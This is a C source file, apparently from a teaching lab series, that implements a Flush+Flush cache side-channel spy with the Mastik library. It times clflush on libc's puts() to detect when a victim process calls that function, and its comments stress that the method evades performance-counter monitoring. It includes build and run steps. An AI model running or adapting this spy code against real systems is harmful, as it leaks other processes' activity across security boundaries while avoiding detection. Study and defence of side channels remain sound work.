/*
 * attack3_flush_flush.c  —  Flush+Flush side-channel attack
 * ─────────────────────────────────────────────────────────────────────────────
 *
 * WHAT IT DOES:
 *   Like Flush+Reload but MORE STEALTHY — never actually reads the target
 *   address, so no cache warming occurs from the spy side. Harder to detect
 *   with performance counter monitors.
 *
 * HOW FLUSH+FLUSH WORKS:
 *   The key insight: CLFLUSH itself takes different time depending on whether
 *   the line is in cache or not:
 *     clflush on a CACHED   line → slower (~160 cycles) — has to do work
 *     clflush on an UNCACHED line → faster (~110 cycles) — nothing to evict
 *
 *   So:
 *   1. Spy flushes the target line.
 *   2. Victim runs — may or may not access target.
 *   3. Spy flushes again and TIMES THE FLUSH ITSELF:
 *        Slow flush → line was in cache → victim accessed it  → HIT
 *        Fast flush → line was NOT cached → victim didn't     → MISS
 *
 *   No reload step → spy never brings target into its own cache → stealthier.
 *
 * BUILD:
 *   gcc -O0 -o attack3_flush_flush attack3_flush_flush.c \
 *       -I$HOME/Mastik -L$HOME/Mastik/src -lmastik
 *
 * RUN (two terminals):
 *   Terminal 1:  LD_LIBRARY_PATH=$HOME/Mastik/src ./attack3_flush_flush
 *   Terminal 2:  ./victim1   (from attack 1)
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <mastik/low.h>
#include "mastik_shared.h"

#define LIBC_PATH      "/lib/x86_64-linux-gnu/libc.so.6"
#define PUTS_OFFSET     0x87be0

/*
 * Flush+Flush threshold: BELOW this = fast flush = line was NOT cached = MISS
 *                        ABOVE this = slow flush = line WAS  cached = HIT
 * (opposite of F+R threshold!)
 */
#define FF_THRESHOLD    140       /* tune: run calibrate target to find split */
#define NUM_SLOTS       80000
#define SLOT_CYCLES     300000

/* Time a single clflush */
static inline uint32_t time_flush(void *addr) {
    mfence();
    uint32_t t1 = rdtscp();
    clflush(addr);
    uint32_t elapsed = rdtscp() - t1;
    mfence();
    return elapsed;
}

int main(void) {
    void *spy_ptr = shared_map_offset(LIBC_PATH, PUTS_OFFSET);
    if (!spy_ptr) {
        fprintf(stderr, "[!] shared_map_offset failed\n");
        return 1;
    }

    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║        ATTACK 3: Flush+Flush Spy (Stealthy)         ║\n");
    printf("╠══════════════════════════════════════════════════════╣\n");
    printf("║ Target  : puts() at 0x%05x in libc               ║\n", PUTS_OFFSET);
    printf("║ Spy ptr : %p                           ║\n", spy_ptr);
    printf("║ FF threshold: %d cycles (above=HIT, below=MISS)    ║\n", FF_THRESHOLD);
    printf("╚══════════════════════════════════════════════════════╝\n\n");

    /* Calibration: measure baseline flush times */
    printf("[calibrate] Warm flush time (line in cache): ");
    /* bring into cache first */
    volatile char x = *(char *)spy_ptr; (void)x;
    printf("%u cycles\n", time_flush(spy_ptr));

    printf("[calibrate] Cold flush time (line not in cache): ");
    /* already flushed above */
    uint64_t d = rdtscp64() + 500000; while(rdtscp64()<d){} /* wait */
    printf("%u cycles\n\n", time_flush(spy_ptr));

    printf("[spy] Monitoring... run victim1 in another terminal.\n\n");

    int hits = 0;

    for (int slot = 0; slot < NUM_SLOTS; slot++) {
        /* Step 1: Flush to start clean */
        clflush(spy_ptr);
        mfence();

        /* Step 2: Wait — victim may access puts() here */
        uint64_t deadline = rdtscp64() + SLOT_CYCLES;
        while (rdtscp64() < deadline) {}

        /* Step 3: Time the second flush — this is the signal */
        uint32_t flush_time = time_flush(spy_ptr);

        /* Slow flush = line was cached = victim accessed it */
        if (flush_time > FF_THRESHOLD) {
            printf("[SLOT %6d] *** HIT ***  puts() detected!  (flush = %3u cycles)\n",
                   slot, flush_time);
            fflush(stdout);
            hits++;
        }
    }

    printf("\n[spy] Done. Detections: %d / %d slots\n", hits, NUM_SLOTS);
    return 0;
}
